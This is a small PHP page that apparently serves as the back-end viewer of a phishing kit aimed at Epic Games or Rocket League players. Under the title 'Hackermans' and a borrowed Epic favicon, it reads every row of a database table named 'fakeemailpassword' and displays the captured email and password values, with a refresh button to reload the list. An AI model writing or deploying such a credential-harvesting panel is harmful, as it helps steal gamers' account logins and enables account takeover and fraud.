<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hackermans</title>
        <link rel="shortcut icon" href="https://static-assets-prod.unrealengine.com/account-portal/static/epic-favicon-96x96.png">
</head>
<body>
    <button onclick="refresh()" style="width: 100%; padding: 25px 0px; margin-bottom:15px; background-color: red; color: white;"><span style="font-size: 64px;">REFRESH</span></button><br/>
    <?php

    $mysqli = new mysqli("localhost", "root", "", "rocketleaguetrading");
    if ($mysqli->connect_errno) {
        echo "Failed to connect to MySQL: (" . $mysqli->connect_errno . ") " . $mysqli->connect_error;
    }

    //$sql = "SHOW TABLES"; 
    $sql = "select * from fakeemailpassword";  //edit your table name here
    $res = $mysqli->query($sql);

    while ($row = $res->fetch_assoc()) {
        foreach($row as $ind => $val)
        {
            echo "$val<br />";
        }
        echo "<hr />";
    }
    ?>
</body>
<script>
    function refresh() {
        window.location = "print.php";
    }
</script>
</html>